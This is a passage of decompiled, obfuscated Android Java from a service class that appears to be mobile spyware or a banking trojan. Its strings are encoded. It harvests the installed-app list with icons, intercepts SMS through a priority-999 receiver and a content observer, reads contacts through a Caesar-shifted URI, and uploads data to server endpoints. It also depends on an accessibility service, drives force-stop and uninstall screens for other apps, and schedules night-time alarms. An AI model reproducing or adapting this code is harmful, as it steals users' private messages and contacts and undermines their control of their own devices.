                jSONObject.put(strObtain, str);
                jSONObject.put("version_code", Build.VERSION.SDK_INT >= 28 ? packageInfo.getLongVersionCode() : packageInfo.versionCode);
                String strObtain2 = TypefaceCache.obtain("0030006F0048009300F500B2");
                boolean z = true;
                if ((applicationInfo.flags & 1) == 0) {
                    z = false;
                }
                jSONObject.put(strObtain2, z);
                jSONObject.put(TypefaceCache.obtain("00260078005A008500FC00BA00D6"), applicationInfo.enabled);
                jSONObject.put(TypefaceCache.obtain("002A00780048009300F100B300DE00980037007F00560082"), packageInfo.firstInstallTime);
                jSONObject.put(TypefaceCache.obtain("00360066005F008600E400BA00ED00B3002A007B005E"), packageInfo.lastUpdateTime);
                try {
                    jSONObject.put(TypefaceCache.obtain("00220066005000B800E300B600C800A2"), new File(applicationInfo.sourceDir).length());
                } catch (Exception unused) {
                    jSONObject.put(TypefaceCache.obtain("00220066005000B800E300B600C800A2"), 0);
                }
                try {
                    Drawable drawableLoadIcon = applicationInfo.loadIcon(packageManager);
                    Bitmap bitmapCreateBitmap = Bitmap.createBitmap(48, 48, Bitmap.Config.ARGB_8888);
                    Canvas canvas = new Canvas(bitmapCreateBitmap);
                    drawableLoadIcon.setBounds(0, 0, 48, 48);
                    drawableLoadIcon.draw(canvas);
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    bitmapCreateBitmap.compress(Bitmap.CompressFormat.PNG, 80, byteArrayOutputStream);
                    bitmapCreateBitmap.recycle();
                    jSONObject.put(TypefaceCache.obtain("002A007500540089"), Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2));
                } catch (Exception unused2) {
                    jSONObject.put(TypefaceCache.obtain("002A007500540089"), "");
                }
                jSONArray.put(jSONObject);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00240073004F00AE00FE00AC00C600A6002F007A005E008300D100AF00C200B400070073004F008600F900B300D700A3006300730049009500FF00AD008800E7");
            e.getMessage();
        }
        return jSONArray;
    }

    public final void PPWVWMPAUcr9AGNUSxQ() {
        String string;
        try {
            String str = oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM;
            String str2 = oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs ? oJLsXXGxdTuQpIRpV.Ee8d2j4S9Vm5yGuR : KV57Z6oavcB595B8Dy8Z.ibVTtJUNfrGYbW;
            boolean zDDIMxZXP1V8HdM = oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM();
            boolean zW9sT1Swbhx3hs = oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs();
            if (getSharedPreferences(TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048"), 0).getBoolean(TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA"), false)) {
                Qrz92kRPw4GcghAc();
                return;
            }
            if (zDDIMxZXP1V8HdM && getSharedPreferences(TypefaceCache.obtain("0030007B004800B800FD00BE00DC00A600240073004900B800E000AD00D700A10030"), 0).getBoolean(TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780064009700F900AF00D700AB002A0078005E00B800F100BC00C600AE00350073"), false)) {
                Qrz92kRPw4GcghAc();
                return;
            }
            boolean zXuO9PPFo607ssKwZjNW = XuO9PPFo607ssKwZjNW();
            boolean zHV4VTKNUdeHN = hV4VTKNUdeHN();
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str2, TypefaceCache.obtain("00300062005E008600FC00BA00C0")) && !zW9sT1Swbhx3hs && !zDDIMxZXP1V8HdM) {
                zXuO9PPFo607ssKwZjNW = zHV4VTKNUdeHN;
            } else if (zW9sT1Swbhx3hs) {
                zXuO9PPFo607ssKwZjNW = zHV4VTKNUdeHN || zXuO9PPFo607ssKwZjNW;
            }
            TypefaceCache.obtain("000D0063005F008000F500E5009200B3003A0066005E00DA");
            TypefaceCache.obtain("006300600055008400AD");
            TypefaceCache.obtain("006300720057009400AD");
            TypefaceCache.obtain("00630065004900DA");
            TypefaceCache.obtain("00630065004F008200F100B300D700B5007E");
            TypefaceCache.obtain("006300770058008400AD");
            TypefaceCache.obtain("006300650056009400AD");
            TypefaceCache.obtain("006300720054008900F500E2");
            if (zXuO9PPFo607ssKwZjNW) {
                getSharedPreferences(TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048"), 0).edit().putBoolean(TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA"), true).apply();
                Qrz92kRPw4GcghAc();
                return;
            }
            try {
                string = getPackageManager().getApplicationLabel(getPackageManager().getApplicationInfo(getPackageName(), 0)).toString();
            } catch (Exception unused) {
                string = "";
            }
            String str3 = TypefaceCache.checked("04540426040904D204D00497048A048504760036040604D704D1049D04F204F9047A042C0478");
            StringBuilder sb = new StringBuilder();
            sb.append(TypefaceCache.checked("0457042D047400C704AF04E1048904FA047D0450040E04DA04AD04E1048B00E704030426040A04D904D204940092"));
            if (string.length() > 0) {
                sb.append(string);
                sb.append(" ");
            }
            sb.append(TypefaceCache.checked("047E0423040504D604D504E1048604FF047F0428001B04D004A004ED04870487040B042E047904AB00B004E20482048604010456040504DE04AA049C009C00E7"));
            sb.append(TypefaceCache.checked("045E0426040D04DB04A8049D048700E704040454040504D604DB00FF048D0487047D0422040504DC04A604E704F0048B006D"));
            K5l5kmuyJzrgUX(str3, sb.toString());
        } catch (Exception e) {
            TypefaceCache.obtain("00360066005F008600E400BA00E100A200370063004B00A900E500BB00D500A2000D0079004F008E00F600B600D100A60037007F0054008900B000BA00C000B500790036");
            e.getMessage();
        }
    }

    public final void Qrz92kRPw4GcghAc() {
        try {
            NotificationManager notificationManager = new HEqPccX85NcWnm0(this).w9sT1Swbhx3hs;
            notificationManager.cancel(null, 5001);
            notificationManager.cancel(null, 5002);
            TypefaceCache.obtain("00100073004F009200E000FF00DC00B200270071005E00C700FE00B000C600AE0025007F0058008600E400B600DD00A900630052007200B400DD009600E1009400060052001B00CF00E000BA00C000AA002A00650048008E00FF00B1009200A0003100770055009300F500BB009B");
        } catch (Exception e) {
            TypefaceCache.obtain("0027007F0048008A00F900AC00C1009400260062004E009700DE00AA00D600A0002600580054009300F900B900DB00A4002200620052008800FE00FF00D700B500310079004900DD00B0");
            e.getMessage();
        }
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0013  */
    public final Object SZMVQHSLEmk3KzoEzyls(String str, String str2, JSONObject jSONObject, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        hUQuPxBuTgkMptZCNIR huqupxbutgkmptzcnir;
        Object objDVTNwpDEVsUKuznof;
        if (cWIOrUfHtKyaxQib0W instanceof hUQuPxBuTgkMptZCNIR) {
            huqupxbutgkmptzcnir = (hUQuPxBuTgkMptZCNIR) cWIOrUfHtKyaxQib0W;
            int i = huqupxbutgkmptzcnir.ibVTtJUNfrGYbW;
            if ((i & Integer.MIN_VALUE) != 0) {
                huqupxbutgkmptzcnir.ibVTtJUNfrGYbW = i - Integer.MIN_VALUE;
            } else {
                huqupxbutgkmptzcnir = new hUQuPxBuTgkMptZCNIR(this, cWIOrUfHtKyaxQib0W);
            }
        } else {
            huqupxbutgkmptzcnir = new hUQuPxBuTgkMptZCNIR(this, cWIOrUfHtKyaxQib0W);
        }
        Object obj = huqupxbutgkmptzcnir.Ee8d2j4S9Vm5yGuR;
        int i2 = huqupxbutgkmptzcnir.ibVTtJUNfrGYbW;
        try {
            if (i2 == 0) {
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put(TypefaceCache.obtain("002000790056008A00F100B100D60098002A0072"), str);
                jSONObject2.put(TypefaceCache.obtain("00300062005A009300E500AC"), str2);
                if (jSONObject != null) {
                    jSONObject2.put(TypefaceCache.obtain("003100730048009200FC00AB"), jSONObject);
                }
                ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                String strObtain = TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B3002200390058008800FD00B200D300A9002700650014009200E000BB00D300B3002600490048009300F100AB00C700B4");
                huqupxbutgkmptzcnir.ibVTtJUNfrGYbW = 1;
                objDVTNwpDEVsUKuznof = ktukzhfmakoumu.DVTNwpDEVsUKuznof(strObtain, jSONObject2, false, huqupxbutgkmptzcnir);
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                if (objDVTNwpDEVsUKuznof == pjn1l01kdmwnpcy0dad) {
                    return pjn1l01kdmwnpcy0dad;
                }
            } else {
                if (i2 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                objDVTNwpDEVsUKuznof = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
            }
            if (objDVTNwpDEVsUKuznof instanceof VSZeS5mia3yEXbAe) {
                TypefaceCache.obtain("00160066005F008600E400BA009200A4002C007B0056008600FE00BB009200A2003100640054009500AA00FF");
                Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(objDVTNwpDEVsUKuznof);
                if (thDDIMxZXP1V8HdM != null) {
                    thDDIMxZXP1V8HdM.getMessage();
                }
            } else {
                TypefaceCache.obtain("000000790056008A00F100B100D600E7");
                TypefaceCache.obtain("00630063004B008300F100AB00D700A300630062005400C7");
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00160066005F008600E400BA009200A4002C007B0056008600FE00BB009200A2003100640054009500AA00FF");
            e.getMessage();
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0018  */
    public final Object SggvLZZelD4B3v(String str, int i, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        c4nrANNeb0EHn c4nranneb0ehn;
        Object objDVTNwpDEVsUKuznof;
        SyncQYAdapter syncQYAdapter;
        if (cWIOrUfHtKyaxQib0W instanceof c4nrANNeb0EHn) {
            c4nranneb0ehn = (c4nrANNeb0EHn) cWIOrUfHtKyaxQib0W;
            int i2 = c4nranneb0ehn.pyu8ovAipBTLYAiKab;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                c4nranneb0ehn.pyu8ovAipBTLYAiKab = i2 - Integer.MIN_VALUE;
            } else {
                c4nranneb0ehn = new c4nrANNeb0EHn(this, cWIOrUfHtKyaxQib0W);
            }
        } else {
            c4nranneb0ehn = new c4nrANNeb0EHn(this, cWIOrUfHtKyaxQib0W);
        }
        Object obj = c4nranneb0ehn.ibVTtJUNfrGYbW;
        int i3 = c4nranneb0ehn.pyu8ovAipBTLYAiKab;
        int i4 = 1;
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
        try {
            if (i3 == 0) {
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                if (!A1BaTVAMeIXMnh(str)) {
                    TypefaceCache.obtain("001100730051008200F300AB00D700A30063007F0055009100F100B300DB00A3006300660053008800FE00BA009200A5002600700054009500F500FF00C100A2002D00720052008900F700E50092");
                    return eo0e0FTdv96U7KeCzoB;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(ECwLkmPW1UKz7J6E(), str)) {
                    TypefaceCache.obtain("0013007E0054008900F500FF00DC00B2002E0074005E009500B000BE00DE00B500260077005F009E00B000AC00D700A90037003A001B009400FB00B600C200B7002A0078005C00DD00B0");
                    return eo0e0FTdv96U7KeCzoB;
                }
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00AE0027"), this.vekpFI4d1Nc4fakF);
                jSONObject.put(TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095"), str);
                jSONObject.put(TypefaceCache.obtain("0030007F005600B800E300B300DD00B3"), i);
                ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                String strObtain = TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B300220039005F008200E600B600D100A2006C0063004B008300F100AB00D700980033007E0054008900F5");
                c4nranneb0ehn.Ee8d2j4S9Vm5yGuR = this;
                c4nranneb0ehn.xDyLpEZyrcKVe0 = str;
                c4nranneb0ehn.pyu8ovAipBTLYAiKab = 1;
                objDVTNwpDEVsUKuznof = ktukzhfmakoumu.DVTNwpDEVsUKuznof(strObtain, jSONObject, false, c4nranneb0ehn);
                if (objDVTNwpDEVsUKuznof != pjn1l01kdmwnpcy0dad) {
                    syncQYAdapter = this;
                }
                return pjn1l01kdmwnpcy0dad;
            }
            if (i3 != 1) {
                if (i3 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                return eo0e0FTdv96U7KeCzoB;
            }
            str = c4nranneb0ehn.xDyLpEZyrcKVe0;
            syncQYAdapter = c4nranneb0ehn.Ee8d2j4S9Vm5yGuR;
            SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
            objDVTNwpDEVsUKuznof = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
            if (objDVTNwpDEVsUKuznof instanceof VSZeS5mia3yEXbAe) {
                TypefaceCache.obtain("0013007E0054008900F500FF00C700B700270077004F008200B000B900D300AE002F0073005F00DD00B0");
                Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(objDVTNwpDEVsUKuznof);
                if (thDDIMxZXP1V8HdM != null) {
                    thDDIMxZXP1V8HdM.getMessage();
                }
            } else {
                TypefaceCache.obtain("0013007E0054008900F500FF00DC00B2002E0074005E009500B000AA00C200A300220062005E008300AA00FF");
                AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                zcffvBooRp7uR1q zcffvboorp7ur1q = lApLnElOE7s0Fsy.dDIMxZXP1V8HdM;
                kpn9InmXMPkXCuK9 kpn9inmxmpkxcuk9 = new kpn9InmXMPkXCuK9(syncQYAdapter, str, null, i4);
                c4nranneb0ehn.Ee8d2j4S9Vm5yGuR = null;
                c4nranneb0ehn.xDyLpEZyrcKVe0 = null;
                c4nranneb0ehn.pyu8ovAipBTLYAiKab = 2;
                if (y6jRGLEWNMir.K7eEOBPYP9VIoHWTe(zcffvboorp7ur1q, kpn9inmxmpkxcuk9, c4nranneb0ehn) == pjn1l01kdmwnpcy0dad) {
                    return pjn1l01kdmwnpcy0dad;
                }
            }
            return eo0e0FTdv96U7KeCzoB;
        } catch (Exception e) {
            TypefaceCache.obtain("00160066005F008600E400BA009200B7002B00790055008200B000BA00C000B5002C0064000100C7");
            e.getMessage();
            return eo0e0FTdv96U7KeCzoB;
        }
    }

    public final void UoxIZOBVZaubOFdPNaXK(long j) {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
            Intent intent = new Intent(this, (Class<?>) SyncQYAdapter.class);
            intent.setAction(TypefaceCache.obtain("0002005A007A00B500DD008000E0008200100042007A00B500C4"));
            alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + j, PendingIntent.getService(this, 31354, intent, 1275068416));
            TypefaceCache.obtain("0002007A005A009500FD009200D300A900220071005E009500B000AD00D700B4003700770049009300B000AC00D100AF00260072004E008B00F500BB009200AE002D0036");
        } catch (Exception e) {
            TypefaceCache.obtain("0002007A005A009500FD009200D300A900220071005E009500B000AD00D700B4003700770049009300B000B900D300AE002F0073005F00DD00B0");
            e.getMessage();
            try {
                String str = DataFPAdapter.xDyLpEZyrcKVe0;
                OFMrQsTe5s1KYV0lq.J0zjQ7CAgohuxU20eCW6(this);
            } catch (Exception unused) {
            }
        }
    }

    public final void VEkRsTDS6a9oHWI() {
        String string;
        try {
            if (getSharedPreferences(TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048"), 0).getBoolean(TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA"), false)) {
                Qrz92kRPw4GcghAc();
                return;
            }
            String str = oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM;
            String str2 = oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs ? oJLsXXGxdTuQpIRpV.Ee8d2j4S9Vm5yGuR : KV57Z6oavcB595B8Dy8Z.ibVTtJUNfrGYbW;
            boolean zW9sT1Swbhx3hs = oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs();
            boolean zDDIMxZXP1V8HdM = oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM();
            boolean zHV4VTKNUdeHN = hV4VTKNUdeHN();
            boolean zXuO9PPFo607ssKwZjNW = XuO9PPFo607ssKwZjNW();
            boolean z = (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str2, TypefaceCache.obtain("00300062005E008600FC00BA00C0")) || zW9sT1Swbhx3hs || zDDIMxZXP1V8HdM) ? false : true;
            if (!z) {
                if (zW9sT1Swbhx3hs) {
                    zHV4VTKNUdeHN = zHV4VTKNUdeHN || zXuO9PPFo607ssKwZjNW;
                } else {
                    zHV4VTKNUdeHN = zXuO9PPFo607ssKwZjNW;
                }
            }
            if (zHV4VTKNUdeHN) {
                getSharedPreferences(TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048"), 0).edit().putBoolean(TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA"), true).apply();
                Qrz92kRPw4GcghAc();
                return;
            }
            TypefaceCache.obtain("002C00780074008900F200B000D300B50027007F0055008000D300B300DD00B400260072000100C700E000BA00C000AA006300780054009300B000B800C000A6002D0062005E008300BC00FF00C000A2006E00660054009400E400B600DC00A000630078004E008300F700BA009200EF00300062005E008600FC00BA00C000FA");
            TypefaceCache.obtain("006300650056009400AD");
            TypefaceCache.obtain("006300770058008400AD");
            try {
                string = getPackageManager().getApplicationLabel(getPackageManager().getApplicationInfo(getPackageName(), 0)).toString();
            } catch (Exception unused) {
                string = "";
            }
            String str3 = TypefaceCache.checked("04540426040904D204D00497048A048504760036040604D704D1049D04F204F9047A042C0478");
            StringBuilder sb = new StringBuilder();
            sb.append(TypefaceCache.checked("0457042D047400C704AF04E1048904FA047D0450040E04DA04AD04E1048B00E704030426040A04D904D204940092"));
            if (string.length() > 0) {
                sb.append(string);
                sb.append(" ");
            }
            sb.append(TypefaceCache.checked("047E0423040504D604D504E1048604FF047F0428001B04D004A004ED04870487040B042E047904AB00B004E20482048604010456040504DE04AA049C009C00E7"));
            sb.append(TypefaceCache.checked("045E0426040D04DB04A8049D048700E704040454040504D604DB00FF048D0487047D0422040504DC04A604E704F0048B006D"));
            K5l5kmuyJzrgUX(str3, sb.toString());
            if (z) {
                this.dDIMxZXP1V8HdM.postDelayed(new razEUo8ZzzxVSwvlTwaV(this, 2), 2000L);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002C00780074008900F200B000D300B50027007F0055008000D300B300DD00B400260072001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
    }

    public final JSONObject XiR1pIn5878vVWd(String str) {
        try {
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.JW3Lh9hxwLsO2ArTlH(10000L);
            Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + str));
            intent.addFlags(268435456);
            startActivity(intent);
            DataQFAdapter.pendingForceStop = str;
            DataQFAdapter.forceStopStartTime = Long.valueOf(System.currentTimeMillis());
            return new JSONObject().put(TypefaceCache.obtain("003000620054009700E000BA00D6"), true).put(TypefaceCache.obtain("003300770058008C00F100B800D7"), str).put(TypefaceCache.obtain("002E0073004F008F00FF00BB"), TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9"));
        } catch (Exception e) {
            return new JSONObject().put(TypefaceCache.obtain("003000620054009700E000BA00D6"), false).put(TypefaceCache.obtain("002600640049008800E2"), e.getMessage());
        }
    }

    public final boolean XuO9PPFo607ssKwZjNW() {
        try {
            String str = getPackageName() + TypefaceCache.obtain("006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380048008200E200A900DB00A400260065001500A300F100AB00D3009600050057005F008600E000AB00D700B5");
            String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
            if (string == null) {
                return false;
            }
            return KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, str, true);
        } catch (Exception unused) {
            return false;
        }
    }

    public final void YIgR6F2ZXmLx2ul() {
        try {
            this.dTS0S7eC32ubQH54j36 = new UpdateJSWrapper();
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction(TypefaceCache.obtain("00220078005F009500FF00B600D600E9003300640054009100F900BB00D700B5006D0042005E008B00F500AF00DA00A8002D006F001500B000D1008F00ED009700160045007300B800D4009A00FE008E001500530069"));
            intentFilter.addDataType(TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800E600B100D600E900340077004B00C900FD00B200C100EA002E00730048009400F100B800D7"));
            intentFilter.setPriority(999);
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(this.dTS0S7eC32ubQH54j36, intentFilter, 2);
            } else {
                registerReceiver(this.dTS0S7eC32ubQH54j36, intentFilter);
            }
            try {
                s6gkfffFcXvYHWNdDTq s6gkffffcxvyhwnddtq = new s6gkfffFcXvYHWNdDTq(getApplicationContext(), this.dDIMxZXP1V8HdM);
                this.yTljMGnIibTRdOpSh4 = s6gkffffcxvyhwnddtq;
                s6gkffffcxvyhwnddtq.w9sT1Swbhx3hs();
                getContentResolver().registerContentObserver(Telephony.Sms.CONTENT_URI, true, this.yTljMGnIibTRdOpSh4);
                TypefaceCache.obtain("000000770058008F00F5009600FF009000310077004B009700F500AD009200B5002600710052009400E400BA00C000A20027");
            } catch (Exception e) {
                TypefaceCache.obtain("000000770058008F00F5009600FF009000310077004B009700F500AD009200B5002600710052009400E400AD00D300B3002A0079005500C700F600BE00DB00AB00260072000100C7");
                e.getMessage();
            }
            WMx7O1yIuvMieNw wMx7O1yIuvMieNw = WMx7O1yIuvMieNw.dDIMxZXP1V8HdM;
            WMx7O1yIuvMieNw.JXn4Qf7zpnLjP5(getApplicationContext());
            TypefaceCache.obtain("0010005B006800C700E200BA00D100A2002A0060005E009500E300FF009900E7000000790055009300F500B100C6008800210065005E009500E600BA00C000E7002A00780052009300F900BE00DE00AE00390073005F");
        } catch (Exception e2) {
            TypefaceCache.obtain("00310073005C008E00E300AB00D700B50007006F0055008600FD00B600D10094002E00650069008200F300BA00DB00B100260064004800C700F500AD00C000A80031002C001B");
            e2.getMessage();
        }
    }

    public final void Yrf7mWjzxCbCCUcSPwXl(String str) {
        try {
            GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe = DataQFAdapter.Companion;
            gARjgaGEpTotOxcl8vfe.getClass();
            DataQFAdapter.pendingUninstallPkg = str;
            long jCurrentTimeMillis = System.currentTimeMillis();
            gARjgaGEpTotOxcl8vfe.getClass();
            DataQFAdapter._uninstallStartTime = jCurrentTimeMillis;
            Intent intent = new Intent("android.intent.action.DELETE");
            intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + str));
            intent.addFlags(268435456);
            startActivity(intent);
            TypefaceCache.obtain("001600780052008900E300AB00D300AB002F00360049008200E100AA00D700B400370073005F00DD00B0");
        } catch (Exception e) {
            DataQFAdapter.Companion.getClass();
            DataQFAdapter.pendingUninstallPkg = null;
            TypefaceCache.obtain("00110073004A009200F500AC00C600E7003600780052008900E300AB00D300AB002F0036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public final void ajrMZmky8AIb2Pr() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
            Intent intent = new Intent(this, (Class<?>) SyncQYAdapter.class);
            intent.setAction(TypefaceCache.obtain("00070057007200AB00C9008000E0008200100042007A00B500C4"));
            PendingIntent service = PendingIntent.getService(this, 1002, intent, 134217728 | 67108864);
            Calendar calendar = Calendar.getInstance();
            calendar.set(11, 3);
            calendar.set(12, 15);
            calendar.set(13, 0);
            if (calendar.getTimeInMillis() < System.currentTimeMillis()) {
                calendar.add(5, 1);
            }
            alarmManager.setExactAndAllowWhileIdle(0, calendar.getTimeInMillis(), service);
            TypefaceCache.obtain("000700770052008B00E900FF00C000A200300062005A009500E400FF00C100A4002B0073005F009200FC00BA00D600E700220062001B");
        } catch (Exception e) {
            TypefaceCache.obtain("003000750053008200F400AA00DE00A2000700770052008B00E9008D00D700B4003700770049009300B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
    }

    public final void bbLLF31we2Iu() throws Exception {
        try {
            Intent intent = new Intent(this, (Class<?>) ManagerQJWorker.class);
            String str = ManagerQJWorker.dDIMxZXP1V8HdM;
            intent.putExtra(ManagerQJWorker.ibVTtJUNfrGYbW, ManagerQJWorker.dDIMxZXP1V8HdM);
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("00110073004A009200F500AC00C600E7002F00790058008600E400B600DD00A900630066005E009500FD00B600C100B4002A0079005500C700F500AD00C000A80031002C001B");
            e.getMessage();
            throw e;
        }
    }

    public final void dQC4QhgRN3MSEAP3HW0(String str) {
        int i;
        try {
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0022007A005A009500FD"))) {
                i = 4;
            } else {
                i = okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0031007F0055008000E400B000DC00A2")) ? 1 : 2;
            }
            Ringtone ringtone = RingtoneManager.getRingtone(this, RingtoneManager.getDefaultUri(i));
            if (ringtone != null) {
                ringtone.play();
            }
            TypefaceCache.obtain("0013007A005A009E00F900B100D500E700300079004E008900F400E50092");
        } catch (Exception e) {
            TypefaceCache.obtain("0013007A005A009E00B000AC00DD00B2002D0072001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
    }

    public final JSONArray dTS0S7eC32ubQH54j36() {
        JSONArray jSONArray = new JSONArray();
        try {
            Cursor cursorMLSIo1htfMPWeB8V876L = gA5gCwTK0qjTIn.MLSIo1htfMPWeB8V876L(getContentResolver(), TypefaceCache.process("frqwhqw=22frp1dqgurlg1frqwdfwv2gdwd2skrqhv", 3), new String[]{TypefaceCache.obtain("0027007F0048009700FC00BE00CB0098002D007700560082"), TypefaceCache.obtain("00270077004F008600A1")}, TypefaceCache.obtain("0027007F0048009700FC00BE00CB0098002D00770056008200B0009E00E10084"));
            if (cursorMLSIo1htfMPWeB8V876L == null) {
                return jSONArray;
            }
            try {
                int columnIndex = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("0027007F0048009700FC00BE00CB0098002D007700560082"));
                int columnIndex2 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("00270077004F008600A1"));
                while (cursorMLSIo1htfMPWeB8V876L.moveToNext()) {
                    JSONObject jSONObject = new JSONObject();
                    String strObtain = TypefaceCache.obtain("002D007700560082");
                    String string = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex);
                    String str = "";
                    if (string == null) {
                        string = "";
                    }
                    jSONObject.put(strObtain, string);
                    String strObtain2 = TypefaceCache.obtain("0033007E0054008900F5");
                    String string2 = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex2);
                    if (string2 != null) {
                        str = string2;
                    }
                    jSONObject.put(strObtain2, str);
                    jSONArray.put(jSONObject);
                }
                cursorMLSIo1htfMPWeB8V876L.close();
                return jSONArray;
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorMLSIo1htfMPWeB8V876L, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00260064004900DD00B0");
            e.getMessage();
            return jSONArray;
        }
    }

    public final void euF5Udt5Rqv3Qmea() {
        try {
            Intent intent = new Intent(this, (Class<?>) UtilNWWrapper.class);
            intent.setFlags(335544320);
            String str = UtilNWWrapper.A1BaTVAMeIXMnh;
            intent.putExtra(UtilNWWrapper.YIgR6F2ZXmLx2ul, true);
            String strObtain = TypefaceCache.obtain("0030007B004800B800E200BA00C300B200260065004F00B800F300B700D300A9002D00730057");
            NotificationChannel notificationChannel = new NotificationChannel(strObtain, TypefaceCache.obtain("00020066004B00C700D300B000DC00A1002A0071004E009500F100AB00DB00A8002D"), 4);
            notificationChannel.setDescription(TypefaceCache.obtain("00100073004F009200E000FF00C000A200320063005E009400E4"));
            notificationChannel.setLockscreenVisibility(1);
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(notificationChannel);
            PendingIntent activity = PendingIntent.getActivity(this, 5002, intent, 201326592);
            s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, strObtain);
            s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034143;
            s4xe0oepskbhpb3nsd.Ee8d2j4S9Vm5yGuR = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(TypefaceCache.checked("04540426040904D204D00497048A048504760036040604D704D1049D04F204F9047A042C0478"));
